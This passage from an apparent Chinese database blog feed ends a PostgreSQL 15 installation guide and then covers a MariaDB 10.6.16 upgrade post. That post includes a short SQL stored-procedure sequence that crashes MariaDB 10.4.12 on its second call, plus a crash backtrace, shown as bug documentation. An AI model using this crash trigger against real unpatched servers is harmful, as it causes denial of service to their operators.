</ol>
<p>主要编译步骤如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.neusoft.edu.cn/postgresql/source/v15.5/postgresql-15.5.tar.gz</span><br><span class="line">tar xzf postgresql-15.5.tar.gz</span><br><span class="line">cd postgresql-15.5</span><br><span class="line">./configure --prefix=/opt/postgresql --with-extra-version=&quot;-ShawnYan&quot;</span><br><span class="line">make world</span><br><span class="line">make install-world</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">configure: using compiler=gcc (GCC) 11.4.1 20230605 (Red Hat 11.4.1-2)</span><br><span class="line">configure: using CFLAGS=-Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Werror=vla -Wendif-labels -Wmissing-format-attribute -Wimplicit-fallthrough=3 -Wcast-function-type -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -Wno-format-truncation -Wno-stringop-truncation -O2</span><br><span class="line">configure: using CPPFLAGS= -D_GNU_SOURCE</span><br><span class="line">configure: using LDFLAGS=  -Wl,--as-needed</span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating GNUmakefile</span><br><span class="line">config.status: creating src/Makefile.global</span><br><span class="line">config.status: creating src/include/pg_config.h</span><br><span class="line">config.status: creating src/include/pg_config_ext.h</span><br><span class="line">config.status: creating src/interfaces/ecpg/include/ecpg_config.h</span><br><span class="line">config.status: linking src/backend/port/tas/dummy.s to src/backend/port/tas.s</span><br><span class="line">config.status: linking src/backend/port/posix_sema.c to src/backend/port/pg_sema.c</span><br><span class="line">config.status: linking src/backend/port/sysv_shmem.c to src/backend/port/pg_shmem.c</span><br><span class="line">config.status: linking src/include/port/linux.h to src/include/pg_config_os.h</span><br><span class="line">config.status: linking src/makefiles/Makefile.linux to src/Makefile.port</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">/usr/bin/mkdir -p &#x27;/opt/postgresql/bin&#x27;</span><br><span class="line">/usr/bin/install -c  vacuumlo &#x27;/opt/postgresql/bin&#x27;</span><br><span class="line">make[2]: Leaving directory &#x27;/home/shawnyan/postgresql-15.5/contrib/vacuumlo&#x27;</span><br><span class="line">make[1]: Leaving directory &#x27;/home/shawnyan/postgresql-15.5/contrib&#x27;</span><br><span class="line">[shawnyan@rocky9 postgresql-15.5]$</span><br></pre></td></tr></table></figure></div>
<!--
mkdir -p /data/pgsql/15/data
chown -R postgres:postgres /data/pgsql

export PGDATA=/data/pgsql/15/data
export PGHOME=/opt/postgresql
export PATH=$PGHOME/bin:$PATH

initdb
-->
<p>安装完成后，初始化数据库，并启动数据库：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 ~]$ pg_ctl -D /data/pgsql/15/data -l logfile start</span><br><span class="line">waiting for server to start.... done</span><br><span class="line">server started</span><br></pre></td></tr></table></figure></div>
<p>连接数据库，查看版本：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 ~]$ psql</span><br><span class="line">psql (15.5-ShawnYan)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# select version();</span><br><span class="line">                                                      version</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 15.5-ShawnYan on x86_64-pc-linux-gnu, compiled by gcc (GCC) 11.4.1 20230605 (Red Hat 11.4.1-2), 64-bit</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=#</span><br></pre></td></tr></table></figure></div>
<h2 id="五、使用-postgresql-系统角色配置安装-PostgreSQL-数据库">五、使用 <code>postgresql</code> 系统角色配置安装 PostgreSQL 数据库</h2>
<p>从红帽8开始，引入了 <code>postgresql</code> 系统角色概念，便于使用 Ansible 批量部署。</p>
<p>确切地说，是从 RHEL 7 增加了新包 <code>rhel-system-roles</code> <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，但 postgresql 系统角色是从 RHEL 8 才加入。</p>
<p>使用该系统角色可以非常便利的对 PostgreSQL 进行安装、配置、部署。在 RHEL 9 上，支持调用该系统角色来维护 PG 13 和 15。</p>
<p>在 Rocky 9.3 中，需要先安装 <code>ansible</code> 和 <code>rhel-system-roles</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf install ansible rhel-system-roles</span><br><span class="line">Last metadata expiration check: 0:10:38 ago on Wed 22 Nov 2023 10:49:04 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                            Architecture         Version                         Repository                 Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> ansible                            noarch               1:7.7.0-1.el9                   epel-aliyun                34 M</span><br><span class="line"> rhel-system-roles                  noarch               1.22.0-2.el9                    appstream                 1.6 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> ansible-core                       x86_64               1:2.14.9-1.el9                  appstream                 2.2 M</span><br><span class="line"> python3-cffi                       x86_64               1.14.5-5.el9                    baseos                    241 k</span><br><span class="line"> python3-cryptography               x86_64               36.0.1-4.el9                    baseos                    1.2 M</span><br><span class="line"> python3-ply                        noarch               3.11-14.el9.0.1                 baseos                    103 k</span><br><span class="line"> python3-pycparser                  noarch               2.20-6.el9                      baseos                    124 k</span><br><span class="line"> python3-resolvelib                 noarch               0.5.4-5.el9                     appstream                  29 k</span><br><span class="line"> sshpass                            x86_64               1.09-4.el9                      appstream                  27 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  9 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 40 M</span><br><span class="line">Installed size: 393 M</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  ansible-1:7.7.0-1.el9.noarch              ansible-core-1:2.14.9-1.el9.x86_64     python3-cffi-1.14.5-5.el9.x86_64</span><br><span class="line">  python3-cryptography-36.0.1-4.el9.x86_64  python3-ply-3.11-14.el9.0.1.noarch     python3-pycparser-2.20-6.el9.noarch</span><br><span class="line">  python3-resolvelib-0.5.4-5.el9.noarch     rhel-system-roles-1.22.0-2.el9.noarch  sshpass-1.09-4.el9.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>然后，准备 playbook:</p>
<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">role</span> <span class="string">with</span> <span class="string">minimal</span> <span class="string">parameters</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">postgresql_version:</span> <span class="string">&quot;15&quot;</span></span><br><span class="line">  <span class="attr">roles:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">rhel-system-roles.postgresql</span></span><br></pre></td></tr></table></figure></div>
<p>下一步，执行 playbook:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 shawnyan]# ansible-playbook pb.yml</span><br><span class="line">[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match &#x27;all&#x27;</span><br><span class="line"></span><br><span class="line">PLAY [Run role with minimal parameters] ********************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] *************************************************************************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Set platform/version specific variables] ******************************************************************</span><br><span class="line">included: /usr/share/ansible/roles/rhel-system-roles.postgresql/tasks/set_vars.yml for localhost</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Ensure ansible_facts used by role] ************************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Set platform/version specific variables] ******************************************************************</span><br><span class="line">skipping: [localhost] =&gt; (item=RedHat.yml)</span><br><span class="line">skipping: [localhost] =&gt; (item=Rocky.yml)</span><br><span class="line">skipping: [localhost] =&gt; (item=Rocky_9.yml)</span><br><span class="line">skipping: [localhost] =&gt; (item=Rocky_9.3.yml)</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Check postgresql.conf] ************************************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Check TLS crt file] ***************************************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Check TLS private key file] *******************************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Gather the package facts] *********************************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Check if requested version is supported in the system (RHEL8)] ********************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Check if requested version is supported in system (RHEL9)] ************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Check requested and installed version of Postgresql] ******************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Ensure required packages are installed] *******************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Init DB] **************************************************************************************************</span><br><span class="line">changed: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Start Postgresql server] **********************************************************************************</span><br><span class="line">changed: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Enable and start existing instance of postgresql server] **************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Set password for super user] ******************************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Enable logging in by password] ****************************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Run provided SQL script] **********************************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Manage certificates] **************************************************************************************</span><br><span class="line">included: /usr/share/ansible/roles/rhel-system-roles.postgresql/tasks/certificate.yml for localhost</span><br><span class="line"></span><br><span class="line">TASK [Generate certificates] *******************************************************************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Install certificate from the default path] ****************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Install certificate from the default path] ****************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Install certificate from custom path] *********************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Install certificate from custom path] *********************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Install certificate file] *********************************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Install postgresql server private key] ********************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Configure pg_hba.conf] ************************************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Create postgresql directory in /etc] **********************************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Link generated conf file with server one] *****************************************************************</span><br><span class="line">changed: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Generate postgresql system-roles-internal.conf] ***********************************************************</span><br><span class="line">ok: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Generate postgresql system-roles.conf] ********************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">TASK [rhel-system-roles.postgresql : Link generated conf file with server one] *****************************************************************</span><br><span class="line">skipping: [localhost]</span><br><span class="line"></span><br><span class="line">RUNNING HANDLER [rhel-system-roles.postgresql : Restart postgresql] ****************************************************************************</span><br><span class="line">changed: [localhost]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *************************************************************************************************************************************</span><br><span class="line">localhost                  : ok=16   changed=4    unreachable=0    failed=0    skipped=17   rescued=0    ignored=0</span><br></pre></td></tr></table></figure></div>
<p>此时，查看 postgres 服务可以看到服务已经处于运行状态。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 shawnyan]# systemctl status postgresql</span><br><span class="line">● postgresql.service - PostgreSQL database server</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/postgresql.service; enabled; preset: disabled)</span><br><span class="line">     Active: active (running) since Tue 2023-11-21 23:49:57 UTC; 13s ago</span><br><span class="line">    Process: 20928 ExecStartPre=/usr/libexec/postgresql-check-db-dir postgresql (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 20930 (postmaster)</span><br><span class="line">      Tasks: 7 (limit: 22756)</span><br><span class="line">     Memory: 44.0M</span><br><span class="line">        CPU: 96ms</span><br><span class="line">     CGroup: /system.slice/postgresql.service</span><br><span class="line">             ├─20930 /usr/bin/postmaster -D /var/lib/pgsql/data</span><br><span class="line">             ├─20931 &quot;postgres: logger &quot;</span><br><span class="line">             ├─20932 &quot;postgres: checkpointer &quot;</span><br><span class="line">             ├─20933 &quot;postgres: background writer &quot;</span><br><span class="line">             ├─20935 &quot;postgres: walwriter &quot;</span><br><span class="line">             ├─20936 &quot;postgres: autovacuum launcher &quot;</span><br><span class="line">             └─20937 &quot;postgres: logical replication launcher &quot;</span><br><span class="line"></span><br><span class="line">Nov 21 23:49:57 rocky9.shawnyan.cn systemd[1]: Starting PostgreSQL database server...</span><br><span class="line">Nov 21 23:49:57 rocky9.shawnyan.cn postmaster[20930]: 2023-11-21 23:49:57.564 UTC [20930] LOG:  redirecting log output to logging collector process</span><br><span class="line">Nov 21 23:49:57 rocky9.shawnyan.cn postmaster[20930]: 2023-11-21 23:49:57.564 UTC [20930] HINT:  Future log output will appear in directory &quot;log&quot;.</span><br><span class="line">Nov 21 23:49:57 rocky9.shawnyan.cn systemd[1]: Started PostgreSQL database server.</span><br></pre></td></tr></table></figure></div>
<p>连接数据库，查看版本：</p>
<!--
[root@rocky9 shawnyan]# rpm -qa|grep postgres
postgresql-private-libs-15.3-1.module+el9.2.0+14925+a515b28a.x86_64
postgresql-15.3-1.module+el9.2.0+14925+a515b28a.x86_64
postgresql-server-15.3-1.module+el9.2.0+14925+a515b28a.x86_64
[root@rocky9 shawnyan]# su - postgres
-->
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 ~]$ psql</span><br><span class="line">psql (15.3)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# \l</span><br><span class="line">                                                 List of databases</span><br><span class="line">   Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges</span><br><span class="line">-----------+----------+----------+-------------+-------------+------------+-----------------+-----------------------</span><br><span class="line"> postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            |</span><br><span class="line"> template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +</span><br><span class="line">           |          |          |             |             |            |                 | postgres=CTc/postgres</span><br><span class="line"> template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +</span><br><span class="line">           |          |          |             |             |            |                 | postgres=CTc/postgres</span><br><span class="line">(3 rows)</span><br><span class="line"></span><br><span class="line">postgres=# select version();</span><br><span class="line">                                                   version</span><br><span class="line">--------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 15.3 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 11.3.1 20221121 (Red Hat 11.3.1-4), 64-bit</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# \q</span><br><span class="line">[postgres@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>到此，我们已经介绍了五种 PostgreSQL 数据库的安装方式，对于不同环境、不同需求，可以选择不同的方式，希望读者开卷有益。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1727158807037026304" >https://www.modb.pro/db/1727158807037026304 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://access.redhat.com/errata/RHEA-2017:2369" >https://access.redhat.com/errata/RHEA-2017:2369 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>rocky</tag>
      </tags>
  </entry>
  <entry>
    <title>再遇“含笑半步颠”，升级 MariaDB 10.6.16 的三个理由</title>
    <url>/2023/mysql/mariadb-v10.6.16-upgrade/</url>
    <content><![CDATA[<img  alt="mariadb_banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240302-aa216387-1210-43df-917c-1d33c5fda25b.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="MariaDB-10-6-16-发版">MariaDB 10.6.16 发版</h2>
<p>11 月 13 日， MariaDB 10.6.16 发版，MariaDB 10.6 是正在维护的长周期版本，维护时间到 2026 年 7 月。该版本修复了若干问题和漏洞。</p>
<p>10.6 系列已经来到了中期版本，对于 2024 年有升级计划的同学可以关注一下，已经在用 10.6 系列的可以考虑小版本更新。</p>
<p>该版本提供了 Docker 镜像，可以一键拉起。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ docker exec -it m616 mysql -uroot -p123456</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 3</span><br><span class="line">Server version: 10.6.16-MariaDB-1:10.6.16+maria~ubu2004 mariadb.org binary distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br><span class="line">MariaDB [(none)]&gt; \s</span><br><span class="line">--------------</span><br><span class="line">mysql  Ver 15.1 Distrib 10.6.16-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2</span><br><span class="line"></span><br><span class="line">Connection id:          3</span><br><span class="line">Current database:</span><br><span class="line">Current user:           root@localhost</span><br><span class="line">SSL:                    Not in use</span><br><span class="line">Current pager:          stdout</span><br><span class="line">Using outfile:          &#x27;&#x27;</span><br><span class="line">Using delimiter:        ;</span><br><span class="line">Server:                 MariaDB</span><br><span class="line">Server version:         10.6.16-MariaDB-1:10.6.16+maria~ubu2004 mariadb.org binary distribution</span><br><span class="line">Protocol version:       10</span><br><span class="line">Connection:             Localhost via UNIX socket</span><br><span class="line">Server characterset:    utf8mb4</span><br><span class="line">Db     characterset:    utf8mb4</span><br><span class="line">Client characterset:    utf8mb3</span><br><span class="line">Conn.  characterset:    utf8mb3</span><br><span class="line">UNIX socket:            /run/mysqld/mysqld.sock</span><br><span class="line">Uptime:                 10 sec</span><br><span class="line"></span><br><span class="line">Threads: 1  Questions: 4  Slow queries: 0  Opens: 17  Open tables: 10  Queries per second avg: 0.400</span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure></div>
<p>MariaDB 10.6.16 中引入了 3 个新系统变量:</p>
<ol>
<li><a href="https://mariadb.com/kb/en/server-system-variables/#note_verbosity"><code>note_verbosity</code></a></li>
<li><a href="https://mariadb.com/kb/en/server-system-variables/#log_slow_max_warnings"><code>log_slow_max_warnings</code></a></li>
<li><a href="https://mariadb.com/kb/en/server-system-variables/#optimizer_max_sel_args"><code>optimizer_max_sel_args</code></a></li>
</ol>
<h2 id="MariaDB-发版模型">MariaDB 发版模型</h2>
<p>在 MariaDB 的版本生命周期中，MariaDB 10.3 及之前的版本均已 EOL。如果仍在使用不再维护的版本，建议进行升级。</p>
<p>MariaDB 10.4 ~ 10.6，是正在维护的主要稳定版本，一般建议在生产环境使用 MariaDB 10.6 的最新小版本，目前是 MariaDB 10.6.16。</p>
<p>从 MariaD 10.7 开始，发版模型发生的重大调整，不再是之前的一年发布一个主流版本，而改为“创新版本 Innovation” + “长期支持版本 LTS”，每年进行四次发布。<br>
创新版本，也是短期维护版本，只在版本GA后维护一年，且主要用于引进新特性，并不建议用于生产环境。</p>
<p>到目前为止，短期维护版本已经发布了 8 个系列，分别是：</p>
<ul>
<li>MariaDB 10.7 (EOL) / 10.8 (EOL) / 10.9 (EOL) / 10.10</li>
<li>MariaDB 11.0 / 11.1 / 11.2 / 11.3</li>
</ul>
<p>对于长期维护 (LTS) 版本，目前正在维护的有且只有：<code>MariaDB 10.11.x</code></p>
<p>现在看来，MariaDB 的发版模型和 MySQL 都选择了新的发布模型，只是 MariaDB 先行一步。</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231121-df761dd0-5b8c-43c1-b265-896bcce91037.png"
                      referrerpolicy="no-referrer"
                >
<p>Ps. 让我们再来回顾一下 MySQL 8.1.0 开始启用的新发版模型</p>
<ul>
<li><a href="https://shawnyan.cn/2023/mysql/mysql-8.1.0-release/">重磅！MySQL 8.1.0 已来！有彩蛋~</a></li>
</ul>
<h2 id="CVE-安全漏洞">CVE 安全漏洞</h2>
<p>MairaDB 10.6.16 中修复了一个 CVE 安全漏洞 <a class="link"   href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22084" >CVE-2023-22084 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>该漏洞发现于 InnoDB 组件，利用该漏洞将允许高特权攻击者通过多种协议访问网络来破坏 MySQL 服务器。成功攻击此漏洞可能导致未经授权的能力，导致MySQL服务器挂起或经常重复的崩溃。</p>
<!--
https://mariadb.com/kb/en/mariadb-10-6-16-release-notes/#security

Vulnerability in the MySQL Server product of Oracle MySQL (component: InnoDB). Supported versions that are affected are 5.7.43 and prior, 8.0.34 and prior and 8.1.0. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.9 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H). 
-->
<h2 id="“含笑半步颠”">“含笑半步颠”</h2>
<p>之前的文章 <a href="https://shawnyan.cn/2023/mysql/mysql-8.0.26-bug-crash/">再遇 MySQL “一招必杀” Bug</a> 介绍过 MySQL 8.0.29 里有个致命缺陷，导致安装包下架。</p>
<p>在 MariaDB 10.6.16 修复了一个隐藏很深的 Bug，这个 Bug 不像上面文章介绍的那么干脆，但也是影响了若干版本，至少从 MariaDB 10.4.12 开始就已经存在了。</p>
<p>来看下如何复现，先创建一个方法，再创建一个程式，然后调用一次正常，第二次调用会导致 DB Crash.</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">delimiter <span class="operator">|</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> cnt() <span class="keyword">RETURNS</span> <span class="type">INTEGER</span> <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="keyword">BEGIN</span> <span class="keyword">RETURN</span> <span class="number">1</span>; <span class="keyword">END</span>;<span class="operator">|</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">PROCEDURE</span> p1() <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="keyword">BEGIN</span> <span class="keyword">DECLARE</span> i <span class="type">INTEGER</span>; <span class="keyword">FOR</span> i <span class="keyword">IN</span> <span class="number">1.</span>.cnt() DO</span><br><span class="line"><span class="keyword">SELECT</span> i; <span class="keyword">END</span> <span class="keyword">FOR</span>; <span class="keyword">END</span>;<span class="operator">|</span></span><br><span class="line">delimiter ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> p1(); <span class="comment">-- OK</span></span><br><span class="line"><span class="keyword">CALL</span> p1(); <span class="comment">-- Crash</span></span><br></pre></td></tr></table></figure></div>
<p>在 MariaDB 10.4.12 中验证，数据库崩溃日志如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-11-21  0:38:47 0 [Note] mysqld: ready for connections.</span><br><span class="line">Version: &#x27;10.4.12-MariaDB-1:10.4.12+maria~bionic&#x27;  socket: &#x27;/var/run/mysqld/mysqld.sock&#x27;  port: 3306  mariadb.org binary distribution</span><br><span class="line">2023-11-21  0:38:47 0 [Note] InnoDB: Buffer pool(s) load completed at 231121  0:38:47</span><br><span class="line"></span><br><span class="line">231121  0:39:51 [ERROR] mysqld got signal 11 ;</span><br><span class="line">This could be because you hit a bug. It is also possible that this binary</span><br><span class="line">or one of the libraries it was linked against is corrupt, improperly built,</span><br><span class="line">or misconfigured. This error can also be caused by malfunctioning hardware.</span><br><span class="line"></span><br><span class="line">To report this bug, see https://mariadb.com/kb/en/reporting-bugs</span><br><span class="line"></span><br><span class="line">We will try our best to scrape up some info that will hopefully help</span><br><span class="line">diagnose the problem, but since we have already crashed,</span><br><span class="line">something is definitely wrong and this may fail.</span><br><span class="line"></span><br><span class="line">Server version: 10.4.12-MariaDB-1:10.4.12+maria~bionic</span><br><span class="line">key_buffer_size=134217728</span><br><span class="line">read_buffer_size=2097152</span><br><span class="line">max_used_connections=1</span><br><span class="line">max_threads=102</span><br><span class="line">thread_count=7</span><br><span class="line">It is possible that mysqld could use up to</span><br><span class="line">key_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 760255 K  bytes of memory</span><br><span class="line">Hope that&#x27;s ok; if not, decrease some variables in the equation.</span><br><span class="line"></span><br><span class="line">Thread pointer: 0x55c6dce18858</span><br><span class="line">Attempting backtrace. You can use the following information to find out</span><br><span class="line">where mysqld died. If you see no messages after this, something went</span><br><span class="line">terribly wrong...</span><br><span class="line">stack_bottom = 0x7efe28147dd8 thread_stack 0x49000</span><br><span class="line">mysqld(my_print_stacktrace+0x2e)[0x55c6d9b09c3e]</span><br><span class="line">mysqld(handle_fatal_signal+0x515)[0x55c6d957dcf5]</span><br><span class="line">/lib/x86_64-linux-gnu/libpthread.so.0(+0x12890)[0x7efe43934890]</span><br><span class="line">mysqld(_ZN7Item_sp7cleanupEv+0x1b)[0x55c6d959b76b]</span><br><span class="line">mysqld(_ZN12Item_func_sp7cleanupEv+0x18)[0x55c6d95e1598]</span><br><span class="line">mysqld(_Z13cleanup_itemsP4Item+0x21)[0x55c6d9361b81]</span><br><span class="line">mysqld(_ZN7sp_head7executeEP3THDb+0xa34)[0x55c6d92d37c4]</span><br><span class="line">mysqld(_ZN7sp_head17execute_procedureEP3THDP4ListI4ItemE+0x808)[0x55c6d92d4e08]</span><br><span class="line">mysqld(+0x657fe5)[0x55c6d9360fe5]</span><br><span class="line">mysqld(_ZN12Sql_cmd_call7executeEP3THD+0x166)[0x55c6d9362e76]</span><br><span class="line">mysqld(_Z21mysql_execute_commandP3THD+0x1f2b)[0x55c6d936a16b]</span><br><span class="line">mysqld(_Z11mysql_parseP3THDPcjP12Parser_statebb+0x22a)[0x55c6d9370d7a]</span><br><span class="line">mysqld(_Z16dispatch_command19enum_server_commandP3THDPcjbb+0x13a1)[0x55c6d9373311]</span><br><span class="line">mysqld(_Z10do_commandP3THD+0x148)[0x55c6d9374be8]</span><br><span class="line">mysqld(_Z24do_handle_one_connectionP7CONNECT+0x25e)[0x55c6d9450dae]</span><br><span class="line">mysqld(handle_one_connection+0x3d)[0x55c6d9450e6d]</span><br><span class="line">/lib/x86_64-linux-gnu/libpthread.so.0(+0x76db)[0x7efe439296db]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(clone+0x3f)[0x7efe4234b88f]</span><br><span class="line"></span><br><span class="line">Trying to get some variables.</span><br><span class="line">Some pointers may be invalid and cause the dump to abort.</span><br><span 